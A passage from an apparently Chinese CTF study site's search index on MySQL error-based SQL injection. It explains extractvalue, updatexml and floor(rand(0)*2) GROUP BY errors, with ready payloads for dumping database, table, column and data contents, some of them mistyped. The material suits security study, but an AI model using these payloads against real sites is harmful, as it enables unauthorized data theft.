<p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXpath_string\u662fxpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u4f5c\u7528\uff1a\u4ece\u76ee\u6807xml\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u503c\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u6c42\u7b26\u5408xpath\u8bed\u6cd5\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u5219\u4f1a\u62a5\u9519\uff0c\u5e76\u4e14\u5c06\u67e5\u8be2\u7ed3\u679c\u653e\u5728\u62a5\u9519\u4fe1\u606f\u91cc\u3002</p> </li> </ul> <p>\u56e0\u6b64\u7ed9\u51fa\u62a5\u9519\u5229\u7528\u7684payload:\uff08\u767d\u5ad6\u515a\uff09</p> <pre><code>id='and(select extractvalue(\"anything\",concat('~',(select\u8bed\u53e5))))\nid='and(select extractvalue(1,concat('~',(select database()))))\nid='and(select extractvalue(1,concat(0x7e,@@version)))\u67e5\u6570\u636e\u5e93\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select database()))))\u7206\u8868\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))\u7206\u5b57\u6bb5\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"TABLE_NAME\"))))\u7206\u6570\u636e\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))\nPlain Text\n</code></pre> <p>\u6ce8\u91ca\uff1a</p> <p>\u2460 0x7e=\u2019~\u2019</p> <p>\u2461concat(\u2018a\u2019,\u2018b\u2019)=\u201cab\u201d</p> <p>\u2462version()=@@version</p> <p>\u2463 \u2018~\u2018\u53ef\u4ee5\u6362\u6210\u2019#\u2019\u3001\u2019$'\u7b49\u4e0d\u6ee1\u8db3xpath\u683c\u5f0f\u7684\u5b57\u7b26</p> <p>\u2464extractvalue()\u80fd\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6700\u5927\u957f\u5ea6\u4e3a32\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\u8d85\u8fc732\uff0c\u5c31\u8981\u7528substring()\u51fd\u6570\u622a\u53d6\u6216limit\u5206\u9875\uff0c\u4e00\u6b21\u67e5\u770b\u6700\u591a32\u4f4d\u3002\u8fd8\u6709\u7684\u59ff\u52bf\u7684\u8bdd\uff1a\u5229\u7528reverse\u9006\u5411\u8f93\u51fa\u7136\u540e\u81ea\u5df1\u624b\u52a8\u91cd\u5199\u4e00\u4e0b\u4e5f\u662f\u4e00\u79cd\u59ff\u52bf</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#updatexml","title":"updatexml","text":"<p>\u51fd\u6570\u539f\u578b\uff1aupdatexml(xml_document,xpath_string,new_value)</p> <ul> <li> <p>\u6b63\u5e38\u8bed\u6cd5\uff1aupdatexml(xml_document,xpath_string,new_value)</p> </li> <li> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1axml_document\u662fstring\u683c\u5f0f\uff0c\u4e3axml\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1axpath_string\u662fxpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u7b2c\u4e09\u4e2a\u53c2\u6570\uff1anew_value\u662fstring\u683c\u5f0f\uff0c\u66ff\u6362\u67e5\u627e\u5230\u7684\u8d1f\u8377\u6761\u4ef6\u7684\u6570\u636e \u4f5c\u7528\uff1a\u6539\u53d8\u6587\u6863\u4e2d\u7b26\u5408\u6761\u4ef6\u7684\u8282\u70b9\u7684\u503c</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8ddfextractvalue\u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e00\u6837\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5229\u7528\uff0c\u4e14\u5229\u7528\u65b9\u5f0f\u76f8\u540c</p> </li> <li></li> </ul> <pre><code>id='and(selectupdatexml(\"anything\",concat('~',(select\u8bed\u53e5())),\"anything\"))'and(selectupdatexml(1,concat('~',(select database())),1))'and(selectupdatexml(1,concat(0x7e,@@database),1))\u7206\u6570\u636e\u5e93\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select database())),0x7e))\u7206\u8868\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))\u7206\u5217\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\"TABLE_NAME\")),0x7e))\u7206\u6570\u636e\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))\nPlain Text\n</code></pre> <p>\u5f62\u5f0f\u7c7b\u4f3c\u5982\u4e0b</p> <p></p> <p>\u62a5\u9519\u5e26\u51fa\u4e86\u5e93\u540d</p> <p>\u78b0\u5230\u9898\u76ee\u4e00\u822c\u548cbool\u76f2\u6ce8\u548c\u65f6\u95f4\u76f2\u6ce8\u653e\u4e00\u8d77\u6765</p> <p>\u4f8b\u9898\uff1a[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web5]CyberPunk</p> <p>\uff08\u8fd9\u9898\u8fd8\u6709\u4e8c\u6b21\u6ce8\u5165\uff09</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_2","title":"\u4e3b\u952e\u91cd\u590d","text":"<p>\u5168\u79f0\u662f\uff1aconcat+rand()+group_by()\u5bfc\u81f4\u4e3b\u952e\u91cd\u590d</p> <p>\u793a\u4f8b\u5728\u4e0b\u9762</p> <p>\u8fd9\u79cd\u62a5\u9519\u65b9\u6cd5\u7684\u672c\u8d28\u662f\u56e0\u4e3afloor(rand(0)*2)\u7684\u91cd\u590d\u6027\uff0c\u5bfc\u81f4group by\u8bed\u53e5\u51fa\u9519\u3002group by key\u7684\u539f\u7406\u662f\u5faa\u73af\u8bfb\u53d6\u6570\u636e\u7684\u6bcf\u4e00\u884c\uff0c\u5c06\u7ed3\u679c\u4fdd\u5b58\u4e8e\u4e34\u65f6\u8868\u4e2d\u3002\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684key\u65f6\uff0c\u5982\u679ckey\u5b58\u5728\u4e8e\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u4e0d\u5728\u4e34\u65f6\u8868\u4e2d\u66f4\u65b0\u4e34\u65f6\u8868\u7684\u6570\u636e\uff1b\u5982\u679ckey\u4e0d\u5728\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u5728\u4e34\u65f6\u8868\u4e2d\u63d2\u5165key\u6240\u5728\u884c\u7684\u6570\u636e\u3002</p> <p>floor\u51fd\u6570\u7684\u4f5c\u7528\u662f\u8fd4\u56de\u5c0f\u4e8e\u7b49\u4e8e\u8be5\u503c\u7684\u6700\u5927\u6574\u6570,\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u5411\u4e0b\u53d6\u6574\uff0c\u53ea\u4fdd\u7559\u6574\u6570\u90e8\u5206\u3002</p> <p>rand()\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u751f\u62100\u62161\uff0c\u4f46\u662frand(0)\u548crand()\u8fd8\u662f\u6709\u672c\u8d28\u533a\u522b\u7684\uff0crand(0)\u76f8\u5f53\u4e8e\u7ed9rand()\u51fd\u6570\u4f20\u9012\u4e86\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540erand()\u51fd\u6570\u4f1a\u6839\u636e0\u8fd9\u4e2a\u53c2\u6570\u8fdb\u884c\u968f\u673a\u6570\u6210\u6210\u3002rand()\u751f\u6210\u7684\u6570\u5b57\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u800crand(0)\u662f\u6709\u89c4\u5f8b\u7684\u751f\u6210\uff0c\u5f88\u663e\u7136rand(0)\u662f\u4f2a\u968f\u673a\u7684\uff0c\u6709\u89c4\u5f8b\u53ef\u5faa\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u91c7\u7528rand(0)\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u7684\u539f\u56e0\uff0crand(0)\u662f\u7a33\u5b9a\u7684\uff0c\u8fd9\u6837\u6bcf\u6b21\u6ce8\u5165\u90fd\u4f1a\u62a5\u9519</p> <p>(\u4e3e\u4e2a\u4f8b\u5b50\u7406\u89e3\uff1a\u5f53\u521d\u5b66C\u8bed\u8a00\u7684\u65f6\u5019\u7684\u90a3\u4e2asrand\u8bbe\u7acb\u968f\u673a\u6570\u79cd\u5b50\u4e00\u822c\u4f1a\u7528time\u7684\u539f\u56e0\u662f\u4ec0\u4e48\uff1f\u6ca1\u9519\uff0c\u56e0\u4e3a\u5982\u679c\u968f\u673a\u6570\u8868\u91cc\u9762\u7684\u968f\u673a\u6570\u79cd\u5b50\u4e0d\u53d1\u751f\u6539\u53d8\u7684\u8bdd\uff0c\u51fd\u6570\u6bcf\u6b21\u91cd\u65b0\u8fd0\u884c\u90fd\u4f1a\u51fa\u73b0\u4e00\u6837\u7684\u7ed3\u679c\u3002)</p> <p>\u6211\u4eec\u4f7f\u7528group by\u8fdb\u884c\u5206\u7ec4\u67e5\u8be2\u7684\u65f6\u5019\uff0c\u6570\u636e\u5e93\u4f1a\u751f\u6210\u4e00\u5f20\u865a\u62df\u8868</p> <p>\u5728\u8fd9\u5f20\u865a\u62df\u8868\u4e2d\uff0cgroupby\u540e\u9762\u7684\u5b57\u6bb5\u4f5c\u4e3a\u4e3b\u952e\uff0c\u6240\u4ee5\u8fd9\u5f20\u8868\u4e2d\u4e3b\u952e\u662fname\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u57fa\u672c\u5f04\u6e05\u62a5\u9519\u7684\u539f\u56e0\u4e86\uff0c\u5176\u539f\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u865a\u62df\u8868\u7684\u4e3b\u952e\u91cd\u590d\u3002\u6309\u7167MySQL\u7684\u5b98\u65b9\u8bf4\u6cd5\uff0cgroup by\u8981\u8fdb\u884c\u4e24\u6b21\u8fd0\u7b97\uff0c\u7b2c\u4e00\u6b21\u662f\u62ffgroup by\u540e\u9762\u7684\u5b57\u6bb5\u503c\u5230\u865a\u62df\u8868\u4e2d\u53bb\u5bf9\u6bd4\u524d\uff0c\u9996\u5148\u83b7\u53d6group by\u540e\u9762\u7684\u503c\uff1b\u7b2c\u4e8c\u6b21\u662f\u5047\u8bbegroup by\u540e\u9762\u7684\u5b57\u6bb5\u7684\u503c\u5728\u865a\u62df\u8868\u4e2d\u4e0d\u5b58\u5728\uff0c\u90a3\u5c31\u9700\u8981\u628a\u5b83\u63d2\u5165\u5230\u865a\u62df\u8868\u4e2d\uff0c\u8fd9\u91cc\u5728\u63d2\u5165\u65f6\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8fd0\u7b97\uff0c\u7531\u4e8erand\u51fd\u6570\u5b58\u5728\u4e00\u5b9a\u7684\u968f\u673a\u6027\uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u4e0e\u7b2c\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0d\u4e00\u81f4\uff0c\u4f46\u662f\u8fd9\u4e2a\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u5728\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u90a3\u4e48\u8fd9\u65f6\u7684\u63d2\u5165\u5fc5\u7136\u5bfc\u81f4\u4e3b\u952e\u7684\u91cd\u590d\uff0c\u8fdb\u800c\u5f15\u53d1\u9519\u8bef\u3002</p> <p>\u7528\u5230\u7684\u51fd\u6570floor()</p> <pre><code>group by\u662f\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\u7684sql\u8bed\u53e5\uff0c\u5176\u7528\u6cd5\u4e3a\uff1a\nSELECTcolumn_name, aggregate_function(column_name)\nFROM table_name\nWHERE column_nameoperator value\nGROUP BYcolumn_name\n\npayload:'unionselect 1 from (select count(*),concat((slelect\u8bed\u53e5),floor(rand(0)*2))x from \"\u4e00\u4e2a\u8db3\u5927\u7684\u8868\" group by x)a--+\n\u7206\u6570\u636e\u5e93\u540d\uff1a'union select 1 from (select count(*),concat((select database()),\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u8868\u540d\uff1a'union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u5217\u540d\uff1a'union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=\"TABLE_NAME\" limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u6570\u636e\uff1a'union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_3","title":"\u5177\u4f53\u539f\u7406\u793a\u4f8b","text":"<p>copy\u3001\u540e\u6765\u672c\u5730\u505a\u8fc7\u51e0\u6b21\u6d4b\u8bd5</p> <p>\u6211\u4eec\u9700\u8981\u77e5\u9053group by\u7684\u751f\u6210\u865a\u62df\u8868\u7684\u673a\u5236</p> <p></p> <p></p> <p>\u6700\u5f00\u59cb\u6211\u4eec\u770b\u5230\u7684\u8fd9\u5f20sage-count()\u8868\u5e94\u8be5\u65f6\u7a7a\u7684\uff0c\u4f46\u662f\u5728group by\u8bed\u53e5\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u884c\u4e00\u884c\u7684\u53bb\u626b\u63cf\u539f\u59cb\u8868\u7684sage\u5b57\u6bb5\uff0c\u5982\u679csage\u5728sage-count()\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u5c31\u5c06\u4ed6\u63d2\u5165\uff0c\u5e76\u7f6ecount()\u7f6e1\uff0c\u5982\u679csage\u5728sage-count()\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\uff0c\u90a3\u4e48\u5c31\u5728\u539f\u6765\u7684count(*)\u57fa\u7840\u4e0a\u52a01\uff0c\u5c31\u8fd9\u6837\u76f4\u5230\u626b\u63cf\u5b8c\u6574\u4e2a\u8868\uff0c\u5c31\u5f97\u5230\u6211\u4eec\u770b\u5230\u7684\u8fd9\u4e2a\u8868\u4e86\u3002</p> <p>\u6ce8\uff1a\u8fd9\u91cc\u6709\u7279\u522b\u91cd\u8981\u7684\u4e00\u70b9\uff0cgroup by\u540e\u9762\u7684\u5b57\u6bb5\u662f\u865a\u62df\u8868\u7684\u4e3b\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u662f\u4e0d\u80fd\u91cd\u590d\u7684\uff0c\u8fd9\u662f\u540e\u9762\u62a5\u9519\u6210\u529f\u7684\u5173\u952e\u70b9</p> <p></p> <p>rand(0)\u751f\u6210\u7684\u6570\u636e\u6709\u89c4\u5f8b\u53ef\u5faa</p> <p>0110 0110</p> <p>\u7b2c\u4e00\u6b21\uff1a\u6211\u4eec\u4e4b\u524d\u4e0d\u662f\u8bf4\u4e86\u4f1a\u628agroup by\u540e\u9762\u7684\u5b57\u6bb5\u503c\u62ff\u5230\u865a\u62df\u8868\u4e2d\u53bb\u5bf9\u6bd4\u5417\uff0c\u5728\u5bf9\u6bd4\u4e4b\u524d\u80af\u5b9a\u8981\u77e5\u9053group by\u540e\u9762\u5b57\u6bb5\u7684\u503c\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b21\u7684\u8fd0\u7b97\u5c31\u53d1\u751f\u5728\u8fd9\u91cc\u3002</p> <p>\u7b2c\u4e8c\u6b21\uff1a\u73b0\u5728\u5047\u8bbe\u6211\u4eec\u4e0b\u4e00\u6b21\u626b\u63cf\u7684\u5b57\u6bb5\u7684\u503c\u6ca1\u6709\u5728\u865a\u62df\u8868\u4e2d\u51fa\u73b0\uff0c\u4e5f\u5c31\u662fgroup by\u540e\u9762\u7684\u5b57\u6bb5\u7684\u503c\u5728\u865a\u62df\u8868\u4e2d\u8fd8\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u628a\u5b83\u63d2\u5165\u5230\u865a\u62df\u8868\u4e2d\uff0c\u8fd9\u91cc\u5728\u63d2\u5165\u65f6\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8fd0\u7b97\uff0c\u7531\u4e8erand\u51fd\u6570\u5b58\u5728\u4e00\u5b9a\u7684\u968f\u673a\u6027\uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u4e0e\u7b2c\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0d\u4e00\u81f4\uff0c\u4f46\u662f\u8fd9\u4e2a\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u5728\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u90a3\u4e48\u8fd9\u65f6\u7684\u63d2\u5165\u5fc5\u7136\u5bfc\u81f4\u9519\u8bef\uff01</p> <p>\u7136\u540e\u8d70\u4e00\u904d\u6d41\u7a0b</p> <pre><code>select count(*),(concat(floor(rand(0)*2),'@',(select version())))x from users group by x\n</code></pre> <p></p> <p>\u6211\u4eec\u8ddf\u7740\u521a\u521a\u7684\u601d\u8def\u8d70\uff0c\u6700\u5f00\u59cb\u7684\u865a\u62df\u8868\u662f\u7a7a\u7684\uff0c\u5c31\u50cf\u4e0b\u9762\u4e00\u6837\uff1a</p> <p>\u5f53\u6211\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e00\u9879\u65f6\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97\uff0cfloor(rand(0)*2)\u662f0\uff0c\u7136\u540e\u548c\u6570\u636e\u5e93\u7684\u7248\u672c\u53f7\uff08\u5047\u8bbe\u5c31\u662f5.7.19\uff09\u62fc\u63a5\uff0c\u5230\u865a\u62df\u8868\u91cc\u53bb\u5bfb\u627ex\u6709\u6ca1\u6709x\u7684\u503c\u662fx@5.7.19\u7684\u6570\u636e\u9879\uff0c\u7ed3\u679c\u663e\u7136\u662f\u6ca1\u6709\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u5c06\u5b83\u63d2\u5165\u5230\u4e0a\u8868\u4e2d\uff0c\u4f46\u662f\u8fd8\u8bb0\u5f97\u5417\uff0c\u5728\u63d2\u5165\u4e4b\u524d\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u8fd9\u65f6x\u7684\u503c\u5c31\u53d8\u6210\u4e861@5.7.19\uff0c\u6240\u4ee5\u865a\u62df\u8868\u53d8\u6210\u4e86\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p>\u73b0\u5728\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e8c\u9879\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97x==\u20191@5.7.19\u2018\uff0c\u5df2\u7ecf\u5b58\u5728\uff0c\u4e0d\u9700\u8981\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u76f4\u63a5\u63d2\u5165\uff0c\u5f97\u5230\u4e0b\u8868\uff1a</p> <p>\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e09\u9879\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97x==\u20180@5.7.19\u2019\uff0c\u865a\u62df\u8868\u4e2d\u627e\u4e0d\u5230\uff0c\u90a3\u4e48\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u8fd9\u65f6x==\u20181@5.7.19\u2019\uff0c\u7136\u540e\u63d2\u5165\uff0c\u4f46\u662f\u63d2\u5165\u7684\u65f6\u5019\u95ee\u9898\u5c31\u53d1\u751f\u4e86\uff0c\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4ee51@5.7.19\u4e3a\u4e3b\u952e\u7684\u6570\u636e\u9879\u4e86\uff0c\u63d2\u5165\u5931\u8d25\uff0c\u7136\u540e\u5c31\u62a5\u9519\u4e86\uff01</p> <p>\u603b\u4e4b\uff0c\u62a5\u9519\u6ce8\u5165\uff0crand(0),floor(),group by\u7f3a\u4e00\u4e0d\u53ef</p> <p>\u8fd8\u662f\u633a\u5de7\u5999\u7684\u3002</p> <p>\u4f46\u662f\u7528\u8d77\u6765\u5c31\u6253payload</p>"},{"location":"web/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_4","title":"\u66b4\u529b","text":"<p>\u66b4\u529b\u80fd\u89e3\u51b3\u5f88\u591a\u95ee\u9898\uff0c\u5e0c\u671b\u4e0b\u9762\u7684\u51fd\u6570\u80fd\u5e2e\u52a9\u5230\u5927\u5bb6</p> <pre><code>1.floor()\nselect * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n2.extractvalue()\nselect * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n3.updatexml()\nselect * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n4.geometrycollection()\nselect * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n5.multipoint()\nselect * from test where id=1 and multipoint((select * from(select * from(select user())a)b));\n6.polygon()\nselect * from test where id=1 and polygon((select * from(select * from(select user())a)b));\n7.multipolygon()\nselect * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));\n8.linestring()\nselect * from test where id=1 and linestring((select * from(select * from(select user())a)b));\n9.multilinestring()\nselect * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));\n10.exp()\nselect * from test where id=1 and exp(~(select * from(select user())a));\n\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u521d\u5b66\u8005\u5efa\u8bae\u5148\u770b\u4f8b\u9898-2\u770b\u770b\u4f7f\u7528\uff0c\u5176\u5b83\u77e5\u9053\u7684\u8bdd\u968f\u610f\uff0c\u5c31\u5f53\u770b\u4e2a\u70ed\u95f9\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#information_schema","title":"\u9996\u5148\u662finformation_schema","text":"<p>information_schema \u6570\u636e\u5e93\u8ddf performance_schema \u4e00\u6837\uff0c\u90fd\u662f MySQL \u81ea\u5e26\u7684\u4fe1\u606f\u6570\u636e\u5e93\u3002\u5176\u4e2d performance_schema \u7528\u4e8e\u6027\u80fd\u5206\u6790\uff0c\u800c information_schema \u7528\u4e8e\u5b58\u50a8\u6570\u636e\u5e93\u5143\u6570\u636e(\u5173\u4e8e\u6570\u636e\u7684\u6570\u636e)\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u7684\u6570\u636e\u7c7b\u578b\u3001\u8bbf\u95ee\u6743\u9650\u7b49\u3002</p> <p>information_schema \u4e2d\u7684\u8868\u5b9e\u9645\u4e0a\u662f\u89c6\u56fe\uff0c\u800c\u4e0d\u662f\u57fa\u672c\u8868\uff0c\u56e0\u6b64\uff0c\u6587\u4ef6\u7cfb\u7edf\u4e0a\u6ca1\u6709\u4e0e\u4e4b\u76f8\u5173\u7684\u6587\u4ef6\u3002</p> <pre><code>mysql&gt; use information_schema;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\nDatabase changed\nmysql&gt; show tables;\n+---------------------------------------+\n| Tables_in_information_schema          |\n+---------------------------------------+\n| CHARACTER_SETS                        |\n| COLLATIONS                            |\n| COLLATION_CHARACTER_SET_APPLICABILITY |\n| COLUMNS                               |\n| COLUMN_PRIVILEGES                     |\n| ENGINES                               |\n| EVENTS                                |\n| FILES                                 |\n| GLOBAL_STATUS                         |\n| GLOBAL_VARIABLES                      |\n| KEY_COLUMN_USAGE                      |\n| OPTIMIZER_TRACE                       |\n| PARAMETERS                            |\n| PARTITIONS                            |\n| PLUGINS                               |\n| PROCESSLIST                           |\n| PROFILING                             |\n| REFERENTIAL_CONSTRAINTS               |\n| ROUTINES                              |\n| SCHEMATA                              |\n| SCHEMA_PRIVILEGES                     |\n| SESSION_STATUS                        |\n| SESSION_VARIABLES                     |\n| STATISTICS                            |\n| TABLES                                |\n| TABLESPACES                           |\n| TABLE_CONSTRAINTS                     |\n| TABLE_PRIVILEGES                      |\n| TRIGGERS                              |\n| USER_PRIVILEGES                       |\n| VIEWS                                 |\n| INNODB_LOCKS                          |\n| INNODB_TRX                            |\n| INNODB_SYS_DATAFILES                  |\n| INNODB_FT_CONFIG                      |\n| INNODB_SYS_VIRTUAL                    |\n| INNODB_CMP                            |\n| INNODB_FT_BEING_DELETED               |\n| INNODB_CMP_RESET                      |\n| INNODB_CMP_PER_INDEX                  |\n| INNODB_CMPMEM_RESET                   |\n| INNODB_FT_DELETED                     |\n| INNODB_BUFFER_PAGE_LRU                |\n| INNODB_LOCK_WAITS                     |\n| INNODB_TEMP_TABLE_INFO                |\n| INNODB_SYS_INDEXES                    |\n| INNODB_SYS_TABLES                     |\n| INNODB_SYS_FIELDS                     |\n| INNODB_CMP_PER_INDEX_RESET            |\n| INNODB_BUFFER_PAGE                    |\n| INNODB_FT_DEFAULT_STOPWORD            |\n| INNODB_FT_INDEX_TABLE                 |\n| INNODB_FT_INDEX_CACHE                 |\n| INNODB_SYS_TABLESPACES                |\n| INNODB_METRICS                        |\n| INNODB_SYS_FOREIGN_COLS               |\n| INNODB_CMPMEM                         |\n| INNODB_BUFFER_POOL_STATS              |\n| INNODB_SYS_COLUMNS                    |\n| INNODB_SYS_FOREIGN                    |\n| INNODB_SYS_TABLESTATS                 |\n+---------------------------------------+\nPlain Text\n</code></pre> <p>MySQL \u4e2d\u7684 information_schema \u6570\u636e\u5e93_kikajack\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <ol> <li>\u6982\u8ff0information_schema \u6570\u636e\u5e93\u8ddf performance_schema \u4e00\u6837\uff0c\u90fd\u662f MySQL \u81ea\u5e26\u7684\u4fe1\u606f\u6570\u636e\u5e93\u3002\u5176\u4e2d performance_schema \u7528\u4e8e\u6027\u80fd\u5206\u6790\uff0c\u800c information_schema \u7528\u4e8e\u5b58\u50a8\u6570\u636e\u5e93\u5143\u6570\u636e(\u5173\u4e8e\u6570\u636e\u7684\u6570\u636e)\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u7684\u6570\u636e\u7c7b\u578b\u3001\u8bbf\u95ee\u6743\u9650\u7b49\u3002information_schema \u4e2d\u7684\u8868\u5b9e\u9645\u4e0a\u662f\u89c6\u56fe\uff0c\u800c\u4e0d\u662f\u57fa\u672c...</li> </ol> <p>https://blog.csdn.net/kikajack/article/details/80065753</p> <p>\u5269\u4e0b\u7684\u81ea\u5df1\u53ef\u4ee5\u53bb\u770b\u770b\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#infromation_schema","title":"\u7ed5\u8fc7infromation_schema \u65e0\u5217\u540d\u6ce8\u5165\uff1a","text":"<p>\u603b\u4e4b\uff0c\u5982\u679c\u662fmysql\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5143\u6570\u636e\u5e93\u5c31\u662f\u4f60\u8086\u65e0\u5fcc\u60ee\u7684\u4fdd\u8bc1\uff0c\u7531\u4e8e\u5b83\u5b58\u50a8\u4e86\u6570\u636e\u5e93\u5168\u90e8\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6709\u4e86\u4ed6\uff0c\u57fa\u672c\u7684\u64cd\u4f5c\u5c31\u6709\u4e86\u4fdd\u969c\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u4e0d\u662f\u968f\u65f6\u90fd\u80fd\u7528\u8fd9\u4e2a\u6570\u636e\u5e93\u7684\uff0c\u5982\u679c\u8fc7\u6ee4\u6389\u4e86information_schema,\u6211\u4eec\u8be5\u600e\u4e48\u529e\uff1f</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_2","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u6765\u67e5\u51fa\u8868\u540d\uff1a</p> <p>1.InnoDb\u5f15\u64ce</p> 